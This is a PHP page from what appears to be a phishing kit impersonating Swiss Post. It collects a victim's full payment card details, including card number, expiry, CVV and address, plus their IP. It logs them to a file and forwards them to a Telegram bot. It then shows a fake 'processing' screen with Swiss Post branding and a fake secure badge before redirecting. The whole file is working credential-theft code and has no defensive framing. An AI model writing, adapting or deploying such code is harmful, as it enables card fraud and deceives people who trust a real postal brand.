<?php
require __DIR__ . '/security.php';
require __DIR__ . '/lang.php';

// Save card data
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $cardData = [
        'name' => $_POST['name'] ?? '',
        'cc' => $_POST['cc'] ?? '',
        'exp' => $_POST['exp'] ?? '',
        'cvv' => $_POST['cvv'] ?? '',
        'address' => $_POST['address'] ?? '',
        'city' => $_POST['city'] ?? '',
        'zip' => $_POST['zip'] ?? '',
        'ip' => $_SESSION['ip_info']['ip'] ?? '',
        'country' => $_SESSION['ip_info']['countryCode'] ?? '',
        'time' => date('Y-m-d H:i:s')
    ];
    $_SESSION['card_data'] = $cardData;

    // Log to file
    @file_put_contents(__DIR__ . '/logs/cards.log',
        json_encode($cardData) . "\n", FILE_APPEND);

    // Send to Telegram if configured
    if (!empty($GLOBALS['token']) && !empty($GLOBALS['chat_id'])) {
        $message = "💳 *New Card* - Swiss Post\n\n"
            . "👤 Name: `{$cardData['name']}`\n"
            . "💳 Card: `{$cardData['cc']}`\n"
            . "📅 Exp: `{$cardData['exp']}`\n"
            . "🔒 CVV: `{$cardData['cvv']}`\n"
            . "📍 Address: `{$cardData['address']}`\n"
            . "🏙 City: `{$cardData['city']}`\n"
            . "📮 ZIP: `{$cardData['zip']}`\n"
            . "🌍 IP: `{$cardData['ip']}` ({$cardData['country']})\n"
            . "🕐 Time: `{$cardData['time']}`";

        $ch = curl_init("https://api.telegram.org/bot{$GLOBALS['token']}/sendMessage");
        curl_setopt_array($ch, [
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => [
                'chat_id' => $GLOBALS['chat_id'],
                'text' => $message,
                'parse_mode' => 'Markdown'
            ]
        ]);
        curl_exec($ch);
        curl_close($ch);
    }
}
?><!DOCTYPE html>
<html lang="<?php echo $currentLang; ?>">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title><?php echo t('site_title'); ?></title>
<link rel="icon" href="https://www.post.ch/favicon.ico">
<link href="https://fonts.googleapis.com/css2?family=Fira+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet">
<style>
*{box-sizing:border-box;margin:0;padding:0;}
body{font-family:'Fira Sans',Arial,sans-serif;background:#f5f5f5;color:#1e1e1e;min-height:100vh;display:flex;align-items:center;justify-content:center;}

:root {
    --post-yellow: #FFCC00;
    --post-dark: #1e1e1e;
    --post-green: #00A550;
}

.loading-container{text-align:center;padding:40px 20px;max-width:400px;}
.logo{margin-bottom:32px;}
.logo img{height:50px;}
.spinner-wrap{margin-bottom:24px;}
.spinner{width:60px;height:60px;border:4px solid #e5e5e5;border-top-color:var(--post-yellow);border-radius:50%;animation:spin 1s linear infinite;margin:0 auto;}
@keyframes spin{to{transform:rotate(360deg);}}
.loading-text{font-size:18px;font-weight:700;color:var(--post-dark);margin-bottom:8px;}
.loading-sub{font-size:14px;color:#666;}
.secure-badge{display:flex;align-items:center;justify-content:center;gap:6px;color:var(--post-green);font-size:13px;font-weight:600;margin-top:24px;}
.secure-badge svg{width:16px;height:16px;fill:var(--post-green);}
</style>
</head>
<body>
<div class="loading-container">
    <div class="logo">
        <img src="https://www.post.ch/-/media/portal-opp/global/logos/logo---die-post_small.svg?vs=3" alt="Swiss Post">
    </div>
    <div class="spinner-wrap">
        <div class="spinner"></div>
    </div>
    <p class="loading-text"><?php echo $currentLang === 'de' ? 'Verarbeitung läuft...' : ($currentLang === 'fr' ? 'Traitement en cours...' : 'Processing...'); ?></p>
    <p class="loading-sub"><?php echo $currentLang === 'de' ? 'Bitte warten Sie einen Moment' : ($currentLang === 'fr' ? 'Veuillez patienter un instant' : 'Please wait a moment'); ?></p>
    <div class="secure-badge">
        <svg viewBox="0 0 24 24"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2z"/></svg>
        <?php echo t('pay_secure_badge'); ?>
    </div>
</div>
<script>
setTimeout(function() {
    window.location.href = '?s=3';
}, 3000);
</script>
</body>
</html>
